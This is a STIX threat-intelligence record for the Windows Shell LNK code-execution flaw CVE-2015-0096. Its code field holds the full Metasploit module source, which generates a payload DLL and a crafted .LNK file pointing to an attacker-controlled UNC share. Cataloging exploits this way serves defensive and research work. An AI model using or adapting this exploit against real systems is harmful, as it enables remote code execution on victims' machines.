{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--86222c05-dba6-46d7-adfa-20f09d5af1e8",
    "created": "2024-08-14T16:35:30.845458Z",
    "modified": "2024-08-14T16:35:30.845462Z",
    "name": "Microsoft Windows Shell LNK Code Execution",
    "description": " This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious DLL. This module creates the required files to exploit the vulnerability. They must be uploaded to an UNC path accessible by the target. This module has been tested successfully on Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027 installed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms15_020_shortcut_icon_dllloader.rb",
            "external_id": "ms15_020_shortcut_icon_dllloader.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0096"
        },
        {
            "source_name": "reference",
            "url": "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VQBOymTF9so"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/pull/4911#Howtoguidehere"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  attr_accessor :dll_base_name\n  attr_accessor :exploit_dll_base_name\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t\t=> 'Microsoft Windows Shell LNK Code Execution',\n      'Description'\t=> %q{\n        This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling\n        of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious\n        DLL. This module creates the required files to exploit the vulnerability. They must be\n        uploaded to an UNC path accessible by the target. This module has been tested successfully\n        on Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027\n        installed.\n      },\n      'Author'\t\t=>\n        [\n          'Michael Heerklotz', # Vulnerability discovery\n          'juan vazquez' # msf module\n        ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'\t=>\n        [\n          ['CVE', '2015-0096'],\n          ['MSB', 'MS15-020'],\n          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Full-details-on-CVE-2015-0096-and-the-failed-MS10-046-Stuxnet/ba-p/6718459#.VQBOymTF9so'],\n          ['URL', 'https://github.com/rapid7/metasploit-framework/pull/4911'] # How to guide here\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'\t\t=>\n        {\n          'Space'\t=> 2048,\n        },\n      'Platform'\t\t=> 'win',\n      'Targets'\t\t=>\n        [\n          ['Automatic',\t{ }]\n        ],\n      'DisclosureDate' => '2015-03-10',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The LNK file', 'msf.lnk']),\n        OptString.new('UNCHOST', [true, 'The host portion of the UNC path to provide to clients (ex: 1.2.3.4).']),\n        OptString.new('UNCSHARE', [true, 'The share folder portion of the UNC path to provide to clients (ex: share).']),\n      ])\n  end\n\n  def smb_host\n    \"\\\\\\\\#{datastore['UNCHOST']}\\\\#{datastore['UNCSHARE']}\\\\\"\n  end\n\n  def exploit_dll_filename\n    name_length = 257 - (smb_host.length + 4 + 2)\n\n    self.dll_base_name = dll_base_name || rand_text_alpha(1)\n    self.exploit_dll_base_name = exploit_dll_base_name || rand_text_alpha(name_length)\n\n    \"#{dll_base_name} #{exploit_dll_base_name}.dll\"\n  end\n\n  def dll_filename\n    self.dll_base_name = dll_base_name || rand_text_alpha(1)\n\n    \"#{dll_base_name}.dll\"\n  end\n\n  def create_exploit_file(file_name, data)\n    unless ::File.directory?(Msf::Config.local_directory)\n      FileUtils.mkdir_p(Msf::Config.local_directory)\n    end\n    path = File.join(Msf::Config.local_directory, file_name)\n    full_path = ::File.expand_path(path)\n    File.open(full_path, 'wb') { |fd| fd.write(data) }\n\n    full_path\n  end\n\n  def dll_create(data)\n    full_path = create_exploit_file(dll_filename, data)\n\n    print_good \"DLL with payload stored at #{full_path}\"\n  end\n\n  def exploit_dll_create(data)\n    full_path = create_exploit_file(exploit_dll_filename, data)\n\n    print_good \"Fake dll to exploit stored at #{full_path}\"\n  end\n\n  def exploit\n    dll = generate_payload_dll\n    dll_create(dll)\n    exploit_dll_create(dll)\n\n    lnk = generate_link(\"#{smb_host}#{exploit_dll_filename}\")\n    file_create(lnk)\n  end\n\n  # stolen from ms10_046_shortcut_icon_dllloader, all the credits to the original authors: 'hdm', 'jduck', 'B_H'\n  def generate_link(unc)\n    uni_unc = unc.unpack('C*').pack('v*')\n    path = ''\n    path << [\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n    ].pack('C*')\n    path << uni_unc\n\n    # LinkHeader\n    ret = [\n      0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x46, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n    ].pack('C*')\n\n    idlist_data = ''\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      0x1f, 0x00, 0xe0, 0x4f, 0xd0, 0x20, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xd8, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    idlist_data << [0x12 + 2].pack('v')\n    idlist_data << [\n      0x2e, 0x1e, 0x20, 0x20, 0xec, 0x21, 0xea, 0x3a, 0x69, 0x10, 0xa2, 0xdd, 0x08, 0x00, 0x2b, 0x30,\n      0x30, 0x9d\n    ].pack('C*')\n    idlist_data << [path.length + 2].pack('v')\n    idlist_data << path\n    idlist_data << [0x00].pack('v') # TERMINAL WOO\n\n    # LinkTargetIDList\n    ret << [idlist_data.length].pack('v') # IDListSize\n    ret << idlist_data\n\n    # ExtraData blocks (none)\n    ret << [rand(4)].pack('V')\n\n    # Patch in the LinkFlags\n    ret[0x14, 4] = ['10000001000000000000000000000000'.to_i(2)].pack('N')\n\n    ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-10",
    "x_mitre_platforms": [
        "win'"
    ]
}